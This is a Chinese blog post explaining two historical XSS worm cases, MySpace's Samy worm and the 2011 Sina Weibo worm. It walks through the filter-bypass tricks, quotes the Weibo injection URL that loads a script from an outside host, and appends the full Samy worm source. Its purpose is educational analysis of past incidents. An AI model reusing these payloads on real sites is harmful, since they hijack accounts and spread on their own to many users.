---
title: XSS蠕虫攻击真实案例两则·过程及原理分享
date: 2017-09-06 18:24:20
tags:
- XSS
- 信息安全
categories: 信息安全
---

第一个要分享的可以说是世界第一则XSS蠕虫事件，该事件的主角是社交网站myspace，黑客叫Kamkar（ [博客地址](https://samy.pl/) ），黑客大牛。另一件则是跟新浪微博有关。之前老有同学抱怨自己微博莫名其妙发布了些奇怪的东西，看了这篇文章应该就会了解其中原委了吧。

<!--more-->

# 故事一：Myspace

以下文章是网友根据Kamkar在其Github上讲述的如何在MySpace上实现第一个XSS工具蠕虫代码的说明翻译的。

1. Myspace 屏蔽了很多标志符。事实上，他们只允许< a \>,< img \>类，和< div \>类，或许还有其他一些（例如，< embed \>类）。他们不允许< script \>类，< body \>类，onClinks,onAnythings,带javascript的< href \>类。但是某些浏览器（IE，部分Safari和其他）允许CSS标识符中带有javascript.即便如此，我们也需要javascript能够正常运行。例如：
    ```html
    <div style=”background:url(‘javascript：alert(1)’)”>
    ```
2. 不能对Div 标识符使用引号，因为已经使用了单引号和双引号。这让JS的编程非常困难。为了让JS运行，我们使用表达式来保存JS代码和通过函数名来运行。例如
     ```html
     <div id=”mycoce” expr=”alert(‘hah!’)”sytle=”background:url(‘javascript：eval(document.all.mycode.expr)’)”>
     ```
3. 现在我们可以执行带单引号的Javascript代码了。但是，MySpace网站禁止了关键字”javascript”.为了实现目的，某些浏览器认可“java\nscript”（就是java\<NEWLINE>script 为”javascript”.例如:
    ```html
    <divid=”mycode”expr=”alert(‘hah!’)”style=”background:url(‘javaScript:eval(document.all.mycode.expr)’)”>
    ```
4. 很好，当我们让单引号其效果后，我们有时还需要双引号。我们将引号转义，例如，“foo\”bar”. Myspace 打击我一下，他们禁止了所有转义，无论是双引号还是单引号。但是，我们依然可以在javascript 中将10进制翻译成ASCII来生成引号。例如:
    ```html
    <div id=”mycode”expr=”alert(‘doublequota:’+String.fromCharCode(34))”style=”background:url(‘javScript:eval(document.all.mycode.expr)’)”>
    ```
5. 为了将代码发布到真正展示的用户简介页面上，我们需要得到这些页面源码。为了获得包含客户ID的浏览页面的源码，我们可以使用document.body.innerHTML。但是Myspace再次打击了我，他们禁止了标识“innerHTML “.我们可以用eval函数来拼接两个字符串组成“innerHTML”.例如:
    ```html
    alert(eval(‘document.body.innt’+’rHTML’))
    ```
6. 是时候访问其他页面了。通常我们使用”iframes”格式，但是即便是隐藏的，“iframes”并不有效，会让用户明显感到有其他东西在运行。所以我们采用AJAX(XML-HTTP)来让实际用户产生HTTP GET和POST到页面。当然，Myspace禁止了XML-HTTP请求所必需的敏感词“onreadstatechange”,我们再次使用EVAL来拼接生产该敏感词。另外，要XML-HTTP在myspace 有效果还需要Cookies.例如:
    ```html
    eval(‘xmlhttp.onread’+’ystatechange=callback’);
    ```
7. 是时候在用户简介上执行GET来获得他们的Hero列表。我们不必删除任何heros,我们仅仅是将自己添加到已有的列表中。如果我们GET他们的简介，我们就能获取他们的列表并且保存备用。综上所述，用XML-HTTP来实现是简单的，除非我们要获得当前浏览该简介的用户ID。正如我说的，我们可以从获取页面源码来实现。好了，我们需要在页面中搜索关键词。但是如果我们这么做，我们会发现自己，因为我们的代码包含相同的关键字。我们再次使用eval()来拼接字符串来避免这个问题。

8. 到此，我们有了heros列表。第一，让我们在addFriends页面执行一个XML-HTTP
   POST请求把自己加到朋友列表中。欧不，这样不行，为啥？我们正在profile.myspace.com页面，但是POST动作要在www.myspace.com 页面去运行。但是XML-HTTP不允许在不同域名间实现GETs/POSTs。为了避免这样，我们要去同一URL而不是在www.myspace.com 页面。你可以继续从www.myspace.com 浏览简介，通过在同一域名中重新装载运行我们执行POST的页面。例如:
    ```javascript
    if(location.hostname== ‘profile.myspace.com’)
    document.location= ‘http://www.myspace.com’+location.pathname + location.search;
    ```
9. 最后我们执行POST请求。但是，当我们发送POST请求后没有添加用户。为啥？原来Myspace为一个预POST页面生产了一个哈希值，例如在“你确定添加该用户为朋友页面”。如果这个哈希值没有与POST一同发生的话，这个POST不会成功执行。为了避免这样，在添加用户前我们模拟一个浏览器去GET该页面，通过分析源码来取得该哈希值，然后带上该哈希值去执行POST请求。

10. 一旦POST请求结束，我们还要添加一个Hero和执行代码。这段代码执行完后就会到hero的同一地方，所以我们只有一个POST请求就可以了。但是，我们需要预GET一个页面来得到一个新的哈希值。但是，第一我们不得不重新生成我们要POST的代码。最简单的办法是获取我们要的页面源码，分析出代码后在发出POST请求。到此为止万事俱备。为了POST请求正在运行我们需要对代码做编码或者转义。可恶，还是不能运行。显然，javascript的URL-Encoding和escape（） 函数不能转义所以必须要的代码。所以我们不得不人工来做这些工作确保必要的代码正确转义。我们添加了一条“but most of all ,samy is my hero”到代码。哇，我们自我复制了一个蠕虫代码。

11. 还有其他限制，例如，最大长度，必需紧凑的代码，没有空格，混乱的命名，重复使用的函数等等。

# 故事二：新浪微博

这个事件是发生在2011年6月28日，敲响国内关于SNS（Social Network Site）网站安全管理的警钟！一直以来，为了SNS更快的发展和获益，很多大型的SNS网站忽略对于安全的管理，人人网，百度空间，搜狐博客这些等都在不同时间内受过蠕虫病毒的侵害，在这其中XSS攻击手法在这些SNS网站上屡试不爽。在此之前，国内多家著名的SNS网站和大型博客网站都曾遭遇过类似的攻击事件，只不过没有形成如此大规模传播。

## 案例回顾

6月28日晚，新浪微博遭遇到XSS蠕虫攻击侵袭，微博用户中招后，会自动通过发微博和私信的方式将XSS蠕虫信息对外传播，发布带有恶意脚本的链接地址，当用户的粉丝点击带有恶意脚本的链接后就会再次中毒，进而形成恶性循环。其中众多加V认证的用户受到感染，当此类用户发布相关微博和私信内容后，蠕虫的传播将变得更为广泛，影响也更为严重。在不到一个小时内，超过三万的微博用户受到病毒感染

## 案例分析

1. 首先，黑客通过对新浪微博的分析测试发现新浪名人堂部分由于代码过滤不严，导致XSS漏洞的存在，并可以通过构造脚本的方式植入恶意代码。通过分析发现，在新浪名人堂部分中，当提交http://weibo.com/pub/star/g/xyyyd" \>< script src=//www.2kt.cn/images/t.js \> \< / script \>?type=update时，新浪会对该字符串进行处理，变成类似http://weibo.com/pub/star.php?g=xyyyd" \>< script src=//www.2kt.cn/images/t.js \></ script \>?type=update，而由于应用程序没有对参数g做充足的过滤，且将参数值直接显示在页面中，相当于 weibo.com 在页面中嵌入了一个来自于 2kt.cn的JS脚本。该JS脚本是黑客可以控制的文件，使得黑客可以构造任意JS脚本嵌入到weibo.com的页面中，且通过Ajax技术完全实现异步提交数据的功能，进而黑客通过构造特定的JS代码实现了受此XSS蠕虫攻击的客户自动发微博、添加关注和发私信等操作。

2. 然后，黑客为了使该XSS蠕虫代码可以大范围的感染传播，会通过发私信或发微博的方式诱惑用户去点击存在跨站代码的链接，尤其是针对V标认证的用户，因为此类用户拥有大量的关注者，所以如果此类用户中毒，必然可以实现蠕虫的大范围、快速的传播。

3. 最后，当大量的加V认证账户和其他普通用户中毒后，这些用户就会通过发微博和发私信的方式将该XSS蠕虫向其他用户进行传播，进而导致了该XSS蠕虫的大范围、快速的传播与感染

# 附Samy 蠕虫源码
```html
<div id=mycode style="BACKGROUND:url('java
script:eval(document.all.mycode.expr)')"expr="var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g(){varC;try{varD=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return
C}else{return eval('document.body.inne'+'rHTML')}}function
getData(AU){M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')}function getQueryParams(){varE=document.location.search;var F=E.substring(1,E.length).split('&');var AS=new Array();for(varO=0;O<F.length;O++){varI=F[O].split('=');AS[I[0]]=I[1]}return AS}var J;varAS=getQueryParams();varL=AS['Mytoken'];varM=AS['friendID'];if(location.hostname=='profile.myspace.com'){document.location='http://www.myspace.com'+location.pathname+location.search}else{if(!M){getData(g())}main()}functiongetClientFID(){return findIn(g(),'up_launchIC( '+A,A)}function nothing(){}functionparamsToString(AV){var N=new
String();var O=0;for(var P
in AV){if(O>0){N+='&'}varQ=escape(AV[P]);while(Q.indexOf('+')!=-1){Q=Q.replace('+','%2B')}while(Q.indexOf('&')!=-1){Q=Q.replace('&','%26')}N+=P+'='+Q;O++}return
N}function httpSend(BH,BI,BJ,BK){if(!J){return
false}eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST'){J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)}J.send(BK);return
true}function findIn(BF,BB,BC){varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))}functiongetHiddenParameter(BF,BG){return findIn(BF,'name='+B+BG+B+' value='+B,B)}function getFromURL(BF,BG){var T;if(BG=='Mytoken'){T=B}else{T='&'}var U=BG+'=';varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y}function getXMLObj(){var Z=false;if(window.XMLHttpRequest){try{Z=new XMLHttpRequest()}catch(e){Z=false}}else
if(window.ActiveXObject){try{Z=new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{Z=newActiveXObject('Microsoft.XMLHTTP')}catch(e){Z=false}}}return
Z}var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);varAF;if(AE){AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF='
but most of all, samy is my hero. <d'+'iv id='+AE+'D'+'IV>'}var AG;function getHome(){if(J.readyState!=4){return}varAU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','</td>');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1){if(AF){AG+=AF;var
AR=getFromURL(AU,'Mytoken');var
AS=new
Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken='+AR,postHero,'POST',paramsToString(AS))}}}functionpostHero(){if(J.readyState!=4){return}var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var
AS=new
Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function
main(){var AN=getClientFID();varBH='/index.cfm?fuseaction=user.viewProfile&friendID='+AN+'&Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken='+L,processxForm,'GET')}functionprocessxForm(){if(xmlhttp2.readyState!=4){return}var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var
AS=new
Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to
Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function
httpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return
false}eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST'){xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)}xmlhttp2.send(BK);return
true}"></DIV>
```
